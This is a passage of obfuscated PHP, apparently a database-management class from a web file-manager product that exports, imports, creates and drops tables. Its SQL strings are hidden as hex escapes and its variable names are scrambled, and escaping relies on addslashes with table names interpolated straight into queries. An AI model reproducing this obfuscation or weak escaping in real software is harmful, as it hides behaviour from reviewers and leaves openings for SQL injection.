$Ö¦ê£‚§ = think_cache($ÜÚÜî²è, $ù’ŠÚß[12], $¿À†ò‚); if (!1 !== $Ö¦ê£‚§) { return $Ö¦ê£‚§; } } $À×£–Ò = $this->query($åÃô»Ø·, $this->parseBind(!empty($Í¼ïÙïÎ[$ù’ŠÚß[361]]) ? $Í¼ïÙïÎ[$ù’ŠÚß[361]] : array())); if ($¿À†ò‚ && !1 !== $À×£–Ò) { think_cache($ÜÚÜî²è, $À×£–Ò, $¿À†ò‚); } return $À×£–Ò; } public function buildSelectSql($õÛÓÔ = array()) { $Ù¹ı—ìá =& $_SERVER[Ùæõ‰Ï’]; if (isset($õÛÓÔ[$Ù¹ı—ìá[429]])) { if (strpos($õÛÓÔ[$Ù¹ı—ìá[429]], $Ù¹ı—ìá[50])) { list($ê¦ıšà, $½›Ïç‚) = explode($Ù¹ı—ìá[50], $õÛÓÔ[$Ù¹ı—ìá[429]]); } else { $ê¦ıšà = $õÛÓÔ[$Ù¹ı—ìá[429]]; } $ê¦ıšà = $ê¦ıšà ? $ê¦ıšà : 1; $½›Ïç‚ = isset($½›Ïç‚) ? $½›Ïç‚ : (is_numeric($õÛÓÔ[$Ù¹ı—ìá[368]]) ? $õÛÓÔ[$Ù¹ı—ìá[368]] : 20); $¢ŠŒƒ‹© = $½›Ïç‚ * ((int) $ê¦ıšà - 1); $õÛÓÔ[$Ù¹ı—ìá[368]] = $¢ŠŒƒ‹© . $Ù¹ı—ìá[50] . $½›Ïç‚; } if (think_config($Ù¹ı—ìá[1135])) { $Şø†Í¦¾ = $Ù¹ı—ìá[1136] . md5(serialize($õÛÓÔ)); $Ù˜Šàš = think_cache($Şø†Í¦¾); if ($Ù˜Šàš) { return $Ù˜Šàš; } } $§ÓØó¢î = $this->parseSql($this->selectSql, $õÛÓÔ); $§ÓØó¢î .= $this->parseLock(isset($õÛÓÔ[$Ù¹ı—ìá[926]]) ? $õÛÓÔ[$Ù¹ı—ìá[926]] : !1); if (isset($Şø†Í¦¾)) { think_cache($Şø†Í¦¾, $§ÓØó¢î); } return $§ÓØó¢î; } public function parseSql($Öí‹ÀÙ­, $ òÉ³â÷ = array()) { $ÎŠ©¬Ëß =& $_SERVER[Ùæõ‰Ï’]; $Öí‹ÀÙ­ = str_replace(array($ÎŠ©¬Ëß[1137], $ÎŠ©¬Ëß[1138], $ÎŠ©¬Ëß[1139], $ÎŠ©¬Ëß[1140], $ÎŠ©¬Ëß[1141], $ÎŠ©¬Ëß[1142], $ÎŠ©¬Ëß[1143], $ÎŠ©¬Ëß[1144], $ÎŠ©¬Ëß[1145], $ÎŠ©¬Ëß[1146], $ÎŠ©¬Ëß[1147]), array($this->parseTable("{$ òÉ³â÷[$ÎŠ©¬Ëß[356]]}"), $this->parseDistinct(isset($ òÉ³â÷[$ÎŠ©¬Ëß[1148]]) ? $ òÉ³â÷[$ÎŠ©¬Ëß[1148]] : !1), $this->parseField(!empty($ òÉ³â÷[$ÎŠ©¬Ëß[350]]) ? $ òÉ³â÷[$ÎŠ©¬Ëß[350]] : $ÎŠ©¬Ëß[220]), $this->parseJoin(!empty($ òÉ³â÷[$ÎŠ©¬Ëß[359]]) ? $ òÉ³â÷[$ÎŠ©¬Ëß[359]] : $ÎŠ©¬Ëß[12]), $this->parseWhere(!empty($ òÉ³â÷[$ÎŠ©¬Ëß[352]]) ? $ òÉ³â÷[$ÎŠ©¬Ëß[352]] : $ÎŠ©¬Ëß[12]), $this->parseGroup(!empty($ òÉ³â÷[$ÎŠ©¬Ëß[578]]) ? $ òÉ³â÷[$ÎŠ©¬Ëß[578]] : $ÎŠ©¬Ëß[12]), $this->parseHaving(!empty($ òÉ³â÷[$ÎŠ©¬Ëß[1149]]) ? $ òÉ³â÷[$ÎŠ©¬Ëß[1149]] : $ÎŠ©¬Ëß[12]), $this->parseOrder(!empty($ òÉ³â÷[$ÎŠ©¬Ëß[441]]) ? $ òÉ³â÷[$ÎŠ©¬Ëß[441]] : $ÎŠ©¬Ëß[12]), $this->parseLimit(!empty($ òÉ³â÷[$ÎŠ©¬Ëß[368]]) ? $ òÉ³â÷[$ÎŠ©¬Ëß[368]] : $ÎŠ©¬Ëß[12]), $this->parseUnion(!empty($ òÉ³â÷[$ÎŠ©¬Ëß[423]]) ? $ òÉ³â÷[$ÎŠ©¬Ëß[423]] : $ÎŠ©¬Ëß[12]), $this->parseComment(!empty($ òÉ³â÷[$ÎŠ©¬Ëß[430]]) ? $ òÉ³â÷[$ÎŠ©¬Ëß[430]] : $ÎŠ©¬Ëß[12])), $Öí‹ÀÙ­); return $Öí‹ÀÙ­; } public function getLastSql($²«º –ì = '') { return $²«º –ì ? $this->modelSql[$²«º –ì] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($±ò®ÜÆ”) { return addslashes($±ò®ÜÆ”); } public function setModel($ßó´‘õË) { $this->model = $ßó´‘õË; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($½¢¸¥ÒĞ = array()) { $ÔøÈ‘÷ß =& $_SERVER[Ùæõ‰Ï’]; if (empty($½¢¸¥ÒĞ)) { $½¢¸¥ÒĞ = $GLOBALS[$ÔøÈ‘÷ß[6]][$ÔøÈ‘÷ß[21]]; } $this->database = $½¢¸¥ÒĞ; } public function model($îõ®‘Ü = '') { return new ModelBase($îõ®‘Ü, $_SERVER[Ùæõ‰Ï’][12], $this->database); } public function db($¬ï¹Ü± = false) { $ÀĞ¯Ê©– =& $_SERVER[Ùæõ‰Ï’]; $™°ãé—ö = array_change_key_case($this->database); if ($this->dbType() == $ÀĞ¯Ê©–[13] || !$¬ï¹Ü±) { return $this->model()->db(); } $ÁÑ´úßâ = $™°ãé—ö[$ÀĞ¯Ê©–[1063]]; $™°ãé—ö[$ÀĞ¯Ê©–[1063]] = $ÀĞ¯Ê©–[12]; if ($™°ãé—ö[$ÀĞ¯Ê©–[1058]] == $ÀĞ¯Ê©–[1055]) { $Â’ñÛÅÁ = $™°ãé—ö[$ÀĞ¯Ê©–[1064]]; $™°ãé—ö[$ÀĞ¯Ê©–[1064]] = substr($Â’ñÛÅÁ, 0, strrpos($Â’ñÛÅÁ, $ÀĞ¯Ê©–[1150])); } $this->database = $™°ãé—ö; $ì¸ÆÍ¡â = $this->model()->db(); try { $å”¾ãàÍ = $ì¸ÆÍ¡â->execute("\163\x68\157\167\40\144\x61\164\x61\x62\141\x73\145\163\x20\154\x69\x6b\x65\x20\47{$ÁÑ´úßâ}\47"); } catch (Exception $Ø’Š·¢û) { } if (!$å”¾ãàÍ) { $ì¸ÆÍ¡â->execute("\x63\x72\x65\141\x74\145\40\x64\141\164\x61\142\x61\x73\145\x20\140{$ÁÑ´úßâ}\140"); } $™°ãé—ö[$ÀĞ¯Ê©–[1063]] = $ÁÑ´úßâ; if ($™°ãé—ö[$ÀĞ¯Ê©–[1058]] == $ÀĞ¯Ê©–[1055]) { $™°ãé—ö[$ÀĞ¯Ê©–[1064]] .= $ÀĞ¯Ê©–[1150] . $ÁÑ´úßâ; } $this->database = $™°ãé—ö; $ì¸ÆÍ¡â->execute("\x75\x73\145\40\140{$ÁÑ´úßâ}\140"); return $ì¸ÆÍ¡â; } public function createTable($Ãœ¹ŞÍš, &$¾³€şî) { $Ù‰©Êì =& $_SERVER[Ùæõ‰Ï’]; if (!IO::exist($Ãœ¹ŞÍš)) { ActionCall($Ù‰©Êì[1151], !0, 0); show_json(LNG($Ù‰©Êì[1152]), !1); } $æ¿·„£ = $this->model()->db(); $Ëçê²‰Æ = sqlSplit(IO::getContent($Ãœ¹ŞÍš)); foreach ($Ëçê²‰Æ as $Èş—¡®ğ) { $°µ’§ô = stripos($Èş—¡®ğ, $Ù‰©Êì[1153]) === 0; if ($°µ’§ô) { $¾³€şî->task[$Ù‰©Êì[1154]] += 1; } $æ¿·„£->execute($Èş—¡®ğ); if ($°µ’§ô) { preg_match($Ù‰©Êì[1155], $Èş—¡®ğ, $­ÛÙë); $¾³€şî->task[$Ù‰©Êì[1156]] = $­ÛÙë[1]; $¾³€şî->update(1); } } } public function insertTable($«ŞÙ·á¹, &$»ôüÒ¨°) { $œì·“ó» =& $_SERVER[Ùæõ‰Ï’]; $­ÔßÒøõ = $this->model()->db(); $ê÷±ŒÌ = $¦İò³ìô ? array($¦İò³ìô) : $­ÔßÒøõ->getTables(); foreach ($«ŞÙ·á¹ as $úñ­ÈŠ‹) { $¦İò³ìô = basename($úñ­ÈŠ‹, $œì·“ó»[871]); if (!in_array($¦İò³ìô, $ê÷±ŒÌ)) { continue; } $»ôüÒ¨°->task[$œì·“ó»[1156]] = $¦İò³ìô; if (get_filesize($úñ­ÈŠ‹) == 0) { continue; } $ğ’îü©ú = $this->sqlToDb($úñ­ÈŠ‹, $»ôüÒ¨°); if (!$ğ’îü©ú) { ActionCall($œì·“ó»[1151], !0, 0); show_json(LNG($œì·“ó»[1157]) . "\133{$¦İò³ìô}\x5d", !1); } } } public function sqlFromDb($ñê”Á, $È¡Ì¡ë, &$­²‚Úóô, $ˆØı¡˜š = '') { if ($­²‚Úóô) { $­²‚Úóô->task[$_SERVER[Ùæõ‰Ï’][1156]] = $ñê”Á; } $¸«¿ìŸ = $this->model($ñê”Á); $İëäÉá˜ = 0; $Û¦ŸŸöš = 0; $¡³ûÈêÎ = 10000; $¾ÄÕ‰ùÀ = fopen($È¡Ì¡ë, $_SERVER[Ùæõ‰Ï’][1158]); $—°‘ = $¸«¿ìŸ->getPk(); $Ÿıßı‰Œ = $¸«¿ìŸ->getDbFields(); $ÂüÖ€Ç‰ = $_SERVER[Ùæõ‰Ï’][12]; if ($GLOBALS[$_SERVER[Ùæõ‰Ï’][870]] && in_array($ñê”Á, array($_SERVER[Ùæõ‰Ï’][1159], $_SERVER[Ùæõ‰Ï’][1160]))) { $ÂüÖ€Ç‰ = $ñê”Á; } do { $’­Ëûœ = array($—°‘ => array($_SERVER[Ùæõ‰Ï’][1105], $Û¦ŸŸöš)); $Éê®îé = $¸«¿ìŸ->where($’­Ëûœ)->field($Ÿıßı‰Œ)->order($—°‘ . $_SERVER[Ùæõ‰Ï’][1161])->limit($¡³ûÈêÎ)->select(); $Éê®îé = !empty($Éê®îé) ? $Éê®îé : array(); if (!($†ÕÊè¿„ = count($Éê®îé))) { break; } $˜§¥Ğ§¿ = end($Éê®îé); $Û¦ŸŸöš = $˜§¥Ğ§¿[$—°‘]; $¥ƒàŠ«ş = array(); foreach ($Éê®îé as $¦Û×¹Çé) { if ($ÂüÖ€Ç‰) { if ($ñê”Á == $_SERVER[Ùæõ‰Ï’][1159]) { if ($¦Û×¹Çé[$_SERVER[Ùæõ‰Ï’][33]] == $_SERVER[Ùæõ‰Ï’][1162]) { $¾¦…ªññ = json_decode($¦Û×¹Çé[$_SERVER[Ùæõ‰Ï’][450]], !0); if ($¾¦…ªññ[$_SERVER[Ùæõ‰Ï’][32]] == $GLOBALS[$_SERVER[Ùæõ‰Ï’][870]] && $¾¦…ªññ[$_SERVER[Ùæõ‰Ï’][833]] != 1) { continue; } } } else { if ($¦Û×¹Çé[$_SERVER[Ùæõ‰Ï’][33]] == $_SERVER[Ùæõ‰Ï’][1163] && $¦Û×¹Çé[$_SERVER[Ùæõ‰Ï’][97]] == $_SERVER[Ùæõ‰Ï’][865]) { continue; } } } if ($ˆØı¡˜š) { $¦Û×¹Çé[$_SERVER[Ùæõ‰Ï’][87]] = "\173\151\x6f\x3a{$ˆØı¡˜š}\x7d" . substr($¦Û×¹Çé[$_SERVER[Ùæõ‰Ï’][87]], strlen("\173\x69\157\x3a{$¦Û×¹Çé[$_SERVER[Ùæõ‰Ï’][900]]}\x7d")); $¦Û×¹Çé[$_SERVER[Ùæõ‰Ï’][900]] = $ˆØı¡˜š; } $¥ƒàŠ«ş[] = $_SERVER[Ùæõ‰Ï’][1164] . $this->sqlEncode($¦Û×¹Çé) . $_SERVER[Ùæõ‰Ï’][1165]; } $¼ºçƒ­Ç = "\x49\x4e\123\105\x52\x54\x20\x49\116\x54\117\x20\x60{$ñê”Á}\x60\40\x28\140" . implode($_SERVER[Ùæõ‰Ï’][1166], $Ÿıßı‰Œ) . $_SERVER[Ùæõ‰Ï’][1167]; fwrite($¾ÄÕ‰ùÀ, $¼ºçƒ­Ç . implode($_SERVER[Ùæõ‰Ï’][1168], $¥ƒàŠ«ş) . $_SERVER[Ùæõ‰Ï’][74] . PHP_EOL); $İëäÉá˜ += $†ÕÊè¿„; if ($­²‚Úóô) { $­²‚Úóô->update($†ÕÊè¿„); } } while ($¡³ûÈêÎ == $†ÕÊè¿„); fclose($¾ÄÕ‰ùÀ); return $İëäÉá˜; } public function sqlToDb($üåä±×ß, &$¹ó„Ş«–) { $ÆÛ‰ÎîĞ =& $_SERVER[Ùæõ‰Ï’]; $ÙÁ¿ËØı = $this->model()->db(); $†ş÷Ş­Ğ = @fopen($üåä±×ß, $ÆÛ‰ÎîĞ[1169]); if (!$†ş÷Ş­Ğ) { return !1; } $ñÑã˜íş = 0; $¯ñãÉÌ” = $ÆÛ‰ÎîĞ[12]; $€òìÅı¼ = array(); $ª´ˆŠ—Ï = $this->dbType(); $‰Å³š˜ = $ª´ˆŠ—Ï == $ÆÛ‰ÎîĞ[13] ? 500 : 2000; $ı¶èÅ–½ = basename($üåä±×ß, $ÆÛ‰ÎîĞ[871]); $Õ÷ËñÇø = 0; $™«Ÿó = 4194304; while (!feof($†ş÷Ş­Ğ)) { $µÙêØûú = trim(fgets($†ş÷Ş­Ğ)); if (!$µÙêØûú) { continue; } $ü»Æä¸ß = $this->sqlDecode($µÙêØûú, $ª´ˆŠ—Ï, $ı¶èÅ–½); if (stripos($ü»Æä¸ß, $ÆÛ‰ÎîĞ[431]) === 0) { if (!$¯ñãÉÌ”) { $¯ñãÉÌ” = $ü»Æä¸ß . $ÆÛ‰ÎîĞ[53]; } continue; } if ($¹ó„Ş«–) { $¹ó„Ş«–->task[$ÆÛ‰ÎîĞ[1154]] += 1; } $ñÑã˜íş++; $€òìÅı¼[] = rtrim(rtrim(trim($ü»Æä¸ß), $ÆÛ‰ÎîĞ[50]), $ÆÛ‰ÎîĞ[74]); $×Ê¬ò = null; $˜“Ñì’§ = strlen($ü»Æä¸ß); $Õ÷ËñÇø += $˜“Ñì’§; $û«Äô»ô = strlen($¯ñãÉÌ”) + $Õ÷ËñÇø + (count($€òìÅı¼) - 1); if ($û«Äô»ô >= $™«Ÿó) { $×Ê¬ò = array_pop($€òìÅı¼); if ($ñÑã˜íş > 1) { $ñÑã˜íş--; } } if ($ñÑã˜íş >= $‰Å³š˜ || $×Ê¬ò) { $ü»Æä¸ß = $¯ñãÉÌ” . implode($ÆÛ‰ÎîĞ[50], $€òìÅı¼); if (!$ÙÁ¿ËØı->execute($ü»Æä¸ß)) { return !1; } if ($¹ó„Ş«–) { $¹ó„Ş«–->update($ñÑã˜íş); } $€òìÅı¼ = array(); $ñÑã˜íş = 0; $Õ÷ËñÇø = 0; if ($×Ê¬ò) { $€òìÅı¼ = array($×Ê¬ò); $ñÑã˜íş = 1; $Õ÷ËñÇø = $˜“Ñì’§; } } } fclose($†ş÷Ş­Ğ); if (!empty($€òìÅı¼)) { $ü»Æä¸ß = $¯ñãÉÌ” . implode($ÆÛ‰ÎîĞ[50], $€òìÅı¼); if (!$ÙÁ¿ËØı->execute($ü»Æä¸ß)) { return !1; } if ($¹ó„Ş«–) { $¹ó„Ş«–->update($ñÑã˜íş); } } return !0; } public function dropTable($‰Üî¨‹è = null) { $ô¦£ìâ¯ = $this->model()->db(); $©ıÚ’­ = $‰Üî¨‹è ? array($‰Üî¨‹è) : $ô¦£ìâ¯->getTables(); if (!$©ıÚ’­) { return; } foreach ($©ıÚ’­ as $‰Üî¨‹è) { if ($‰Üî¨‹è) { $‰Üî¨‹è = strtolower($‰Üî¨‹è); } else { continue; } $ô¦£ìâ¯->execute("\x64\162\x6f\x70\40\x74\x61\x62\x6c\145\x20\x69\146\40\145\170\151\x73\164\x73\40\x60{$‰Üî¨‹è}\140"); } } private function sqlEncode($—Ğ•ƒ¶£) { $ùîŸŒå =& $_SERVER[Ùæõ‰Ï’]; $—‹ŞüÆ· = array(); foreach ($—Ğ•ƒ¶£ as $ßàÉúÛ) { if (is_array($ßàÉúÛ)) { $ßàÉúÛ = json_encode_force($ßàÉúÛ); } $ßàÉúÛ = addslashes($ßàÉúÛ); $ßàÉúÛ = str_replace(array($ùîŸŒå[1170], $ùîŸŒå[262], $ùîŸŒå[418]), array($ùîŸŒå[1171], $ùîŸŒå[1172], $ùîŸŒå[1173]), $ßàÉúÛ); $—‹ŞüÆ·[] = $ßàÉúÛ; } return $ùîŸŒå[58] . implode($ùîŸŒå[1174], $—‹ŞüÆ·) . $ùîŸŒå[58]; } private function sqlDecode($üä©ÑñÎ, $Ç ©³§, $¬·šÔëÄ = '') { $û­ ˆåö =& $_SERVER[Ùæõ‰Ï’]; $üä©ÑñÎ = str_replace(array($û­ ˆåö[1171], $û­ ˆåö[1172], $û­ ˆåö[1173]), array($û­ ˆåö[1170], $û­ ˆåö[262], $û­ ˆåö[418]), $üä©ÑñÎ); if ($Ç ©³§ == $û­ ˆåö[13]) { $üä©ÑñÎ = str_ireplace($û­ ˆåö[1175], $û­ ˆåö[59], $üä©ÑñÎ); $üä©ÑñÎ = stripslashes($üä©ÑñÎ); } return preg_replace($û­ ˆåö[1176], $û­ ˆåö[12], $üä©ÑñÎ); if ($Ç ©³§ == $û­ ˆåö[13]) { return $¬·šÔëÄ != $û­ ˆåö[1177] ? stripslashes($üä©ÑñÎ) : $üä©ÑñÎ; } if ($¬·šÔëÄ == $û­ ˆåö[1177]) { $üä©ÑñÎ = str_replace($û­ ˆåö[1178], $û­ ˆåö[121], stripslashes($üä©ÑñÎ)); } return $üä©ÑñÎ; } public function getSqlFile($Û®ïÅí÷ = '') { $ÙÕÄ…¬Í =& $_SERVER[Ùæõ‰Ï’]; $ˆ„ÖØ•ß = $this->dbType(!0); $şÆšó‡¯ = CONTROLLER_DIR . "\x69\x6e\163\164\x61\154\154\x2f\x64\141\x74\x61\x2f{$ˆ„ÖØ•ß}\x2e\163\x71\154"; $†õû®áš = file_get_contents($şÆšó‡¯); $Áì¸ì¡ = $ÙÕÄ…¬Í[1179] . ($ˆ„ÖØ•ß == $ÙÕÄ…¬Í[887] ? $ÙÕÄ…¬Í[1180] : $ÙÕÄ…¬Í[1181]) . $ÙÕÄ…¬Í[1182]; preg_match_all($Áì¸ì¡, $†õû®áš, $‚Í‰¸½¥); $ç¥à­ÁŞ = $‚Í‰¸½¥[1]; $ó¹ş¨º = $this->model()->db(); $òüˆ‡ï¿ = $ó¹ş¨º->getTables(); $î¬¾Ä—Î = TEMP_FILES . $ÙÕÄ…¬Í[1183] . date($ÙÕÄ…¬Í[272]) . $ÙÕÄ…¬Í[8]; del_dir($î¬¾Ä—Î); mk_dir($î¬¾Ä—Î); $¯±ªªø = $î¬¾Ä—Î . $ÙÕÄ…¬Í[1184]; $ªğû‘Õ¨ = $î¬¾Ä—Î . $ÙÕÄ…¬Í[1185]; $µ°‘â´µ = $ˆ„ÖØ•ß == $ÙÕÄ…¬Í[13] ? $ÙÕÄ…¬Í[887] : $ÙÕÄ…¬Í[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\164\141\x6c\x6c\57\x64\141\x74\141\x2f{$µ°‘â´µ}\x2e\163\161\x6c", $î¬¾Ä—Î); @touch($î¬¾Ä—Î . $ˆ„ÖØ•ß . $ÙÕÄ…¬Í[871]); $¾«Åª†Ç = fopen($¯±ªªø, $ÙÕÄ…¬Í[1158]); $Ó—…Ÿ´ = fopen($ªğû‘Õ¨, $ÙÕÄ…¬Í[1158]); if ($ˆ„ÖØ•ß == $ÙÕÄ…¬Í[13]) { $òüˆ‡ï¿ = array_diff($òüˆ‡ï¿, array($ÙÕÄ…¬Í[863], $ÙÕÄ…¬Í[864])); $“‘ªÕƒ– = array($ÙÕÄ…¬Í[1186], $ÙÕÄ…¬Í[1187], $ÙÕÄ…¬Í[1188]); fwrite($Ó—…Ÿ´, implode(PHP_EOL, $“‘ªÕƒ–) . PHP_EOL . PHP_EOL); foreach ($òüˆ‡ï¿ as $„’ü§’ô) { $°ã’é = $this->sqlFromSqlite($„’ü§’ô); if (!$°ã’é[$ÙÕÄ…¬Í[13]]) { continue; } fwrite($Ó—…Ÿ´, $°ã’é[$ÙÕÄ…¬Í[13]] . PHP_EOL . PHP_EOL); if (!in_array($„’ü§’ô, $ç¥à­ÁŞ)) { fwrite($¾«Åª†Ç, $°ã’é[$ÙÕÄ…¬Í[887]] . PHP_EOL . PHP_EOL); } } } else { foreach ($òüˆ‡ï¿ as $„’ü§’ô) { $°ã’é = $this->sqlFromMysql($„’ü§’ô); if (!$°ã’é[$ÙÕÄ…¬Í[887]]) { continue; } fwrite($¾«Åª†Ç, $°ã’é[$ÙÕÄ…¬Í[887]] . PHP_EOL . PHP_EOL); if (!in_array($„’ü§’ô, $ç¥à­ÁŞ)) { fwrite($Ó—…Ÿ´, $°ã’é[$ÙÕÄ…¬Í[13]] . PHP_EOL . PHP_EOL); } } } fclose($¾«Åª†Ç); fclose($Ó—…Ÿ´); $†õû®áš = array($ÙÕÄ…¬Í[887] => $¯±ªªø, $ÙÕÄ…¬Í[13] => $ªğû‘Õ¨); return $Û®ïÅí÷ ? $†õû®áš[$Û®ïÅí÷] : $†õû®áš; } public function dbType($Ö¶ëüô = false) { $ª…à¦º =& $_SERVER[Ùæõ‰Ï’]; $“å¬±ùò = $Ö¶ëüô ? $GLOBALS[$ª…à¦º[6]][$ª…à¦º[21]] : $this->database; $“å¬±ùò = array_change_key_case($“å¬±ùò); $àŒê¢•ü = $“å¬±ùò[$ª…à¦º[1058]]; if ($àŒê¢•ü == $ª…à¦º[1055]) { $¦²É¦ãÛ = explode($ª…à¦º[4], $“å¬±ùò[$ª…à¦º[1064]]); $àŒê¢•ü = $¦²É¦ãÛ[0]; } $È¤ë†¢ = array($ª…à¦º[1189] => $ª…à¦º[13], $ª…à¦º[1001] => $ª…à¦º[887]); if (isset($È¤ë†¢[$àŒê¢•ü])) { $àŒê¢•ü = $È¤ë†¢[$àŒê¢•ü]; } return $àŒê¢•ü; } public function sqlFromMysql($Š†§ïÅ„, $µŠî­Áæ = '') { $±¡Ì€¯ =& $_SERVER[Ùæõ‰Ï’]; $ âüÈı = $this->model()->db(); $ğ›Ï…¿Ë = $ âüÈı->query($±¡Ì€¯[1190] . $Š†§ïÅ„ . $±¡Ì€¯[461]); if (!$ğ›Ï…¿Ë || !$ğ›Ï…¿Ë[0]) { return !1; } $ßÉªÊô¹ = _get($ğ›Ï…¿Ë[0], $±¡Ì€¯[1191], $±¡Ì€¯[12]); if (!$ßÉªÊô¹) { return !1; } $¶öïƒ = "\104\x52\x4f\x50\40\x54\x41\102\114\x45\40\x49\x46\x20\105\130\111\123\x54\123\x20\140{$Š†§ïÅ„}\140\x3b" . PHP_EOL . $ßÉªÊô¹ . $±¡Ì€¯[74]; if ($µŠî­Áæ && $µŠî­Áæ == $±¡Ì€¯[887]) { return $¶öïƒ; } $’ÍéÓØÉ = array_change_key_case($GLOBALS[$±¡Ì€¯[6]][$±¡Ì€¯[21]]); $ÏÛñšÎô = $’ÍéÓØÉ[$±¡Ì€¯[1063]]; $Ûó¢ª„  = $±¡Ì€¯[1192] . $ÏÛñšÎô . $±¡Ì€¯[1193] . $Š†§ïÅ„ . $±¡Ì€¯[58]; $¼¢–º†ù = $±¡Ì€¯[1194] . $Š†§ïÅ„ . $±¡Ì€¯[989]; $ñ¿«À§ = $ âüÈı->query($Ûó¢ª„ ); if (empty($ñ¿«À§)) { $Ä¸Úß¦ = array($±¡Ì€¯[887] => $±¡Ì€¯[12], $±¡Ì€¯[13] => $±¡Ì€¯[12]); return $µŠî­Áæ ? $Ä¸Úß¦[$µŠî­Áæ] : $Ä¸Úß¦; } $àƒ²»¨Á = $ âüÈı->query($¼¢–º†ù); $Å•èç÷ = $±¡Ì€¯[12]; $ª˜ÙÑÜ = array(); foreach ($àƒ²»¨Á as $ÃèÇº§©) { if (!$Å•èç÷ && $ÃèÇº§©[$±¡Ì€¯[1195]] == $±¡Ì€¯[1196]) { $Å•èç÷ = $ÃèÇº§©[$±¡Ì€¯[1197]]; } if (isset($ª˜ÙÑÜ[$ÃèÇº§©[$±¡Ì€¯[1195]]])) { $ª˜ÙÑÜ[$ÃèÇº§©[$±¡Ì€¯[1195]]][$±¡Ì€¯[1198]][] = $ÃèÇº§©[$±¡Ì€¯[1197]]; continue; } $ª˜ÙÑÜ[$ÃèÇº§©[$±¡Ì€¯[1195]]] = array($±¡Ì€¯[1199] => $ÃèÇº§©[$±¡Ì€¯[1195]], $±¡Ì€¯[1198] => array($ÃèÇº§©[$±¡Ì€¯[1197]]), $±¡Ì€¯[1200] => $ÃèÇº§©[$±¡Ì€¯[1201]] == $±¡Ì€¯[91] ? 0 : 1); } $¬ëÒÌ„ = array(); foreach ($ª˜ÙÑÜ as $ÃèÇº§©) { $‹ˆöÔÓà = $ÃèÇº§©[$±¡Ì€¯[1199]] == $±¡Ì€¯[1196]; $“ÙçÜß = array($±¡Ì€¯[1202], $ÃèÇº§©[$±¡Ì€¯[1200]] == $±¡Ì€¯[91] && !$‹ˆöÔÓà ? $±¡Ì€¯[1203] : $±¡Ì€¯[12], $±¡Ì€¯[1204], $±¡Ì€¯[1205] . $Š†§ïÅ„ . $±¡Ì€¯[11] . ($‹ˆöÔÓà ? $±¡Ì€¯[1206] : $ÃèÇº§©[$±¡Ì€¯[1199]]) . $±¡Ì€¯[121], $±¡Ì€¯[1207], $±¡Ì€¯[121] . $Š†§ïÅ„ . $±¡Ì€¯[121], $±¡Ì€¯[1208] . implode($±¡Ì€¯[1209], $ÃèÇº§©[$±¡Ì€¯[1198]]) . $±¡Ì€¯[1210]); $¬ëÒÌ„[] = implode($±¡Ì€¯[53], $“ÙçÜß) . $±¡Ì€¯[74]; } $§Íœ—™ = array(); $Æ×ğ÷¾ü = array($±¡Ì€¯[1211] => $±¡Ì€¯[1212], $±¡Ì€¯[1212] => $±¡Ì€¯[1212], $±¡Ì€¯[364] => $±¡Ì€¯[391], $±¡Ì€¯[363] => $±¡Ì€¯[391]); foreach ($ñ¿«À§ as $ÃèÇº§©) { $“ÙçÜß = array($±¡Ì€¯[121] . $ÃèÇº§©[$±¡Ì€¯[1213]] . $±¡Ì€¯[121], isset($Æ×ğ÷¾ü[$ÃèÇº§©[$±¡Ì€¯[1214]]]) ? $Æ×ğ÷¾ü[$ÃèÇº§©[$±¡Ì€¯[1214]]] : $ÃèÇº§©[$±¡Ì€¯[1215]], $ÃèÇº§©[$±¡Ì€¯[1216]] == $±¡Ì€¯[987] ? $±¡Ì€¯[1217] : $±¡Ì€¯[1218], $ÃèÇº§©[$±¡Ì€¯[1213]] == $Å•èç÷ ? $±¡Ì€¯[1219] : $±¡Ì€¯[12], $ÃèÇº§©[$±¡Ì€¯[1038]] ? strtoupper(str_replace($±¡Ì€¯[11], $±¡Ì€¯[12], $ÃèÇº§©[$±¡Ì€¯[1038]])) : $±¡Ì€¯[12]); $§Íœ—™[] = trim(implode($±¡Ì€¯[53], $“ÙçÜß)); } $Ø¬¹ÁÕº = array($±¡Ì€¯[1220] . $Š†§ïÅ„ . $±¡Ì€¯[1221], $±¡Ì€¯[1222] . $Š†§ïÅ„ . $±¡Ì€¯[1223], implode($±¡Ì€¯[50] . PHP_EOL, $§Íœ—™), $±¡Ì€¯[1035]); $ß¯ğ¨´Ï = implode(PHP_EOL, array_merge($Ø¬¹ÁÕº, $¬ëÒÌ„)); if ($µŠî­Áæ && $µŠî­Áæ == $±¡Ì€¯[13]) { return $ß¯ğ¨´Ï; } $Ä¸Úß¦ = array($±¡Ì€¯[887] => $¶öïƒ, $±¡Ì€¯[13] => $ß¯ğ¨´Ï); return $µŠî­Áæ ? $Ä¸Úß¦[$µŠî­Áæ] : $Ä¸Úß¦; } public function sqlFromSqlite($„Õ¯Ş½ø, $µ¶ë® = '') { $¼©º†Úà =& $_SERVER[Ùæõ‰Ï’]; $Îïşíº = $this->model()->db(); $ùÅÈĞ³ş = "\x50\122\101\107\115\101\40\x54\101\102\114\x45\137\x49\116\106\117\40\x28\47{$„Õ¯Ş½ø}\x27\x29"; $ä ûã…€ = "\123\105\114\105\x43\124\x20\52\40\x46\x52\117\x4d\40\163\x71\154\x69\x74\145\x5f\x6d\141\163\x74\145\162\x20\127\110\105\x52\105\x20\164\142\154\x5f\156\141\x6d\145\x20\75\x20\47{$„Õ¯Ş½ø}\x27"; $–“è‰Ô = $Îïşíº->query($ùÅÈĞ³ş); if (empty($–“è‰Ô)) { $‰õµÇ¾„ = array($¼©º†Úà[887] => $¼©º†Úà[12], $¼©º†Úà[13] => $¼©º†Úà[12]); return $µ¶ë® ? $‰õµÇ¾„[$µ¶ë®] : $‰õµÇ¾„; } $şÃ¤­¢× = $Îïşíº->query($ä ûã…€); $Ú¯ìÖÀ = $íòš†ùı = array(); foreach ($şÃ¤­¢× as $¾İã„ûÖ) { if ($¾İã„ûÖ[$¼©º†Úà[33]] == $¼©º†Úà[356]) { $Ú¯ìÖÀ[] = $¾İã„ûÖ[$¼©º†Úà[1224]]; } else { $íòš†ùı[$¾İã„ûÖ[$¼©º†Úà[32]]] = $¾İã„ûÖ[$¼©º†Úà[1224]]; } } $¬Ñ¥­— = array_merge(array($¼©º†Úà[1220] . $„Õ¯Ş½ø . $¼©º†Úà[121]), $Ú¯ìÖÀ, array_values($íòš†ùı)); $¬Ñ¥­— = implode($¼©º†Úà[74] . 